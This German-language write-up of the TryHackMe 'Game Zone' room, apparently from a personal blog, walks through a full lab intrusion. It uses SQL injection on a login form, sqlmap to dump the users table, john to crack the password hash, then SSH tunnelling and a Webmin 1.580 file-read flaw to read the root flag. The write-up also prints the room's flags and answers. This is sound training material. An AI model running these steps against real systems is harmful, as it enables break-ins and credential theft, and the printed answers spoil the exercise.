---
title: "Game Zone Writeup"
date: 2023-06-14
tags: [writeup, ctf, tryhackme]
description: "Scannen und Exploit eines verwundbaren Webforums im TryHackMe-Raum Game Zone, um eine Shell zu bekommen und Rechte zu eskalieren."
---

## Setup 

Zuerst müssen wir uns mit dem TryHackMe-VPN-Server verbinden. Mehr Infos dazu findest du auf der [Access](https://tryhackme.com/access)-Seite.

Ich benutze openvpn, um mich mit dem Server zu verbinden. Hier ist der Befehl:

```
$ sudo openvpn --config NovusEdge.ovpn
```

## Reconnaissance

Das Ausführen von `nmap`-Scans liefert uns folgende Informationen:
```shell-session
$ sudo nmap -sS -Pn -vv --top-ports 2000 -oN nmap_scan.txt TARGET_IP 

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Wenn wir den HTTP-Dienst auf Port 80 aufrufen, werden wir von folgender Seite begrüßt:
![](/assets/img/writeup_assets/game-zone/home-page.png)


> What is the name of the large cartoon avatar holding a sniper on the forum?
>
> Answer: Agent 47

Auf der Seite gibt es 2 Eingabefelder: eins für `Site Search` und eins für `User Login`. Wir können auf eine mögliche Datenbank-(SQL-)Injection testen, indem wir ein paar SQLi-Strings eingeben:
![](/assets/img/writeup_assets/game-zone/sqli-simple-login.png)

Das erfolgreiche Einloggen leitet uns auf folgende Seite weiter:
![](/assets/img/writeup_assets/game-zone/portal-login-dash.png)

> When you've logged in, what page do you get redirected to?
>
> Answer: `portal.php`

Da das Ziel für SQLi anfällig ist, können wir jetzt SQLMap für die weitere Recon nutzen...


Mit Burpsuite fangen wir den Request ab, den der Browser beim Zugriff auf die Seite `portal.php` sendet:
```http
POST /portal.php HTTP/1.1
Host: TARGET_IP
Content-Length: 14
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://TARGET_IP
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://TARGET_IP/portal.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=kfd3hokcd5krmlmrofgs4q45q7
Connection: close

searchitem=asd
```

Wir können das in einer Datei speichern und an SQLMap übergeben, um die User-Session zu authentifizieren:
```shell-session
$ sqlmap -r portal-request.txt --dbms=mysql --dump

...
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y

...

POST parameter 'searchitem' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N

...

do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y

...

do you want to crack them via a dictionary-based attack? [Y/n/q] 

...

what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1

...

do you want to use common password suffixes? (slow!) [y/N] N

...
```

Das liefert uns den Passwort-Hash für den User: `agent47`.

> In the users table, what is the hashed password?
>
> Answer: `ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`

> What was the username associated with the hashed password?
>
> Answer: `agent47`

Wir erhalten außerdem Einträge aus einer Tabelle namens `post` in der Datenbank `db`.

> What was the other table name?
>
> Answer: `post`


Da wir nun den Passwort-Hash für `agent47` haben, können wir `john` verwenden, um ihn zu cracken und das Passwort des Users zu bekommen.
```shell-session
$ echo ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 > hash.txt

$ sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
...
videogamer124    (?)     
```

> What is the de-hashed password?
>
> Answer: `videogamer124`

Jetzt können wir versuchen, uns via `ssh` mit den Zugangsdaten `agent47:videogamer124` auf dem Server einzuloggen.

## Gaining Access

Mit den Credentials aus der Recon-Phase loggen wir uns nun auf dem SSH-Dienst des Servers ein.
```shell-session
$ ssh agent47@TARGET_IP
...
agent47@TARGET_IP's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
agent47@gamezone:~$
```

Jetzt können wir uns das User-Flag holen:
```shell-session
agent47@gamezone:~$ ls
user.txt
agent47@gamezone:~$ cat user.txt
649ac17b1480ac13ef1e4fa579dac95c
```

> What is the user flag?
>
> Answer: `649ac17b1480ac13ef1e4fa579dac95c`

Prüfen der aktiven Socket-Verbindungen auf der Zielmaschine:
```shell-session
Netid State      Recv-Q Send-Q                                               Local Address:Port                                                              Peer Address:Port               
udp   UNCONN     0      0                                                                *:10000                                                                        *:*                  
udp   UNCONN     0      0                                                                *:68                                                                           *:*                  
tcp   LISTEN     0      80                                                       127.0.0.1:3306                                                                         *:*                  
tcp   LISTEN     0      128                                                              *:10000                                                                        *:*                  
tcp   LISTEN     0      128                                                              *:22                                                                           *:*                  
tcp   LISTEN     0      128                                                             :::80                                                                          :::*                  
tcp   LISTEN     0      128                                                             :::22                                                                          :::*
```

> How many TCP sockets are running?
>
> Answer: 5

Da der Dienst auf Port 10000 durch eine Firewall blockiert wird, können wir einen SSH-Tunnel nutzen, um diesen Port lokal verfügbar zu machen.
```shell-session
$ ssh -L 10000:localhost:10000 agent47@TARGET_IP
agent47@TARGET_IP's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Sun Nov 27 23:59:23 2022 from TARGET_IP
agent47@gamezone:~$
```

Jetzt können wir `localhost:10000` im Browser aufrufen:
![](/assets/img/writeup_assets/game-zone/localhost-10000.png)



> What is the name of the exposed CMS?
>
> Answer: `Webmin`

Mit den Zugangsdaten `agent47:videogamer124` können wir uns bei diesem Dienst einloggen:
![](/assets/img/writeup_assets/game-zone/webmin-dash.png)

> What is the CMS version?
>
> Answer: `1.580`

## Privilege Escalation

Mit `searchsploit` können wir nun nach Exploits für `Webmin 1.580` suchen:
```shell-session
$ searchsploit webmin 1.58     
-------------------------------------------------------- ---------------------------------
 Exploit Title                                          |  Path
-------------------------------------------------------- ---------------------------------
Webmin 1.580 - '/file/show.cgi' Remote Command Executio | unix/remote/21851.rb
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Discl | multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Discl | multiple/remote/2017.pl
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metas | linux/webapps/47330.rb
-------------------------------------------------------- ---------------------------------
Shellcodes: No Results


```

Wir können die Logik des zweiten Exploits nutzen. Wenn wir einfach zu `localhost:10000/file/show.cgi/root/root.txt` navigieren, erhalten wir den Inhalt der Datei `root.txt`.

> What is the root flag?
>
> Answer: `a4b945830144bdd71908d12d902adeee`

## Conclusion

Wenn dir dieses Writeup geholfen hat, folge mir gerne auf [github](https://github.com/NovusEdge) und/oder lass einen Star auf dem Repository da: https://github.com/NovusEdge/thm-writeups


- Room: [Game Zone](https://tryhackme.com/room/gamezone)
